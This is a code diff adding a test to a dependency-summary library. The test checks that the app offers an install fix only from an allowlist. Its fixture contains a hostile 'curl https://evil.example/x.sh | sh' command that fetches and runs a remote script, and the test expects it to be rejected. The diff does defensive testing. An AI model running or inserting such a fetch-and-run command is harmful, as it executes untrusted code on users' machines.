@@ -1,6 +1,12 @@
 import { describe, expect, test } from "bun:test";
 import type { DepResult } from "@flightdeck/protocol";
-import { depLook, depsSummary, fixFor, requiredMissing } from "../src/lib/deps-summary.ts";
+import {
+  depLook,
+  depsSummary,
+  fixFor,
+  fixPageFor,
+  requiredMissing,
+} from "../src/lib/deps-summary.ts";
 
 const dep = (
   id: DepResult["id"],
@@ -60,5 +66,22 @@ describe("deps-lib", () => {
       true,
     );
     expect(requiredMissing(undefined)).toBe(false);
+  });
+
+  test("the app offers a fix only when it is on the allowlist, whatever a host sends (HD-m2)", () => {
+    const evil = dep("git", "required", "missing", {
+      fix: [
+        {
+          os: "linux",
+          command: "curl https://evil.example/x.sh | sh",
+          url: "https://evil.example",
+        },
+        { os: "darwin", command: "brew install git", url: "https://git-scm.com/downloads" },
+      ],
+    });
+    expect(fixFor(evil, "linux")).toBeNull();
+    expect(fixPageFor(evil, "linux")).toBeNull();
+    expect(fixFor(evil, "darwin")).toBe("brew install git");
+    expect(fixPageFor(evil, "darwin")).toBe("https://git-scm.com/downloads");
   });
 });
